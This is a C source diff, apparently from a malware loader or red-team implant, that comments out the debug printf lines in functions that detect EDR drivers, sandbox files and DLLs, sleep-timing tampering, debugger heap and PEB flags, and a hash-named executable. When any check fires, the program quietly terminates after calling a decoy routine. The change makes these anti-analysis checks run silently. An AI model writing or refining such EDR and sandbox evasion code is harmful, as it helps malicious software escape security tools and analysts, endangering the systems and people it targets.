@@ -26,7 +26,7 @@ bool DetS() {
     do {
         for (int i = 0; i < sizeof(edrDrivers) / sizeof(edrDrivers[0]); i++) {
             if (StrStrIA(findFileData.cFileName, edrDrivers[i])) {
-                printf("[!] Detected EDR: %s\n", edrDrivers[i]);
+                // printf("[!] Detected EDR: %s\n", edrDrivers[i]);
                 SortNumbers();
                 return true;
             }
@@ -49,7 +49,7 @@ bool DetSl() {
     double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;
 
     if (elapsedMs < 9000.0 || elapsedMs > 11000.0) {
-        printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
+        // printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
         SortNumbers();
         return true;
     }
@@ -88,7 +88,7 @@ bool DetSBF() {
         if (!decodedPath) continue;
 
         if (pPathFileExistsA(decodedPath)) {
-            printf("[!] Sandbox file detected!\n");
+            // printf("[!] Sandbox file detected!\n");
             SortNumbers();
             free(decodedPath);
             return true;
@@ -136,7 +136,7 @@ bool DetF() {
     fileName[strlen(fileName) - 4] = '\0';  // Remove ".exe"
 
     if (_stricmp(fileName, hashStr) == 0) {
-        printf("[!] File name matches MD5 hash (possible packed execution)\n");
+        // printf("[!] File name matches MD5 hash (possible packed execution)\n");
         SortNumbers();
         return true;
     }
@@ -170,7 +170,7 @@ bool DetSBD() {
         HMODULE lib_inst = LoadLibraryA(decodedPath);
         if (lib_inst == NULL) {
             SortNumbers();
-            printf("Checks : %s\n", decodedPath);
+            // printf("Checks : %s\n", decodedPath);
             free(decodedPath);
             return true;
         }
@@ -183,7 +183,7 @@ bool DetSBD() {
         HMODULE lib_inst = GetModuleHandleA(decodedPath);
         if (lib_inst != NULL) {
             SortNumbers();
-            printf("Checks : %s\n", decodedPath);
+            // printf("Checks : %s\n", decodedPath);
             free(decodedPath);
             return true;
         }
@@ -237,32 +237,32 @@ bool DetFH() {
 bool PerfomChecksEnv() {
     bool detected = false;
 
-    printf("[*] Checking for EDRs...\n");
+    // printf("[*] Checking for EDRs...\n");
     detected |= DetS();
 
-    printf("[*] Checking for sleep patching...\n");
+    // printf("[*] Checking for sleep patching...\n");
     detected |= DetSl();
 
-    printf("[*] Checking for sandbox files...\n");
+    // printf("[*] Checking for sandbox files...\n");
     detected |= DetSBF();
 
-    printf("[*] Checking for filename hash matching...\n");
+    // printf("[*] Checking for filename hash matching...\n");
     detected |= DetF();
 
-    printf("[*] Checking for dll...\n");
+    // printf("[*] Checking for dll...\n");
     detected |= DetSBD();
 
-    printf("[*] Checking for NtGlobalFlag...\n");
+    // printf("[*] Checking for NtGlobalFlag...\n");
     detected |= DetFPEB();
 
-    printf("[*] Checking for Heap Flags...\n");
+    // printf("[*] Checking for Heap Flags...\n");
     detected |= DetFH();
 
-    if (detected) {
-        printf("[!] Env unsafe, terminating execution.\n");
-    } else {
-        printf("[*] No sandbox detected.\n");
-    }
+    // if (detected) {
+    //     printf("[!] Env unsafe, terminating execution.\n");
+    // } else {
+    //     printf("[*] No sandbox detected.\n");
+    // }
 
     return detected;
 }
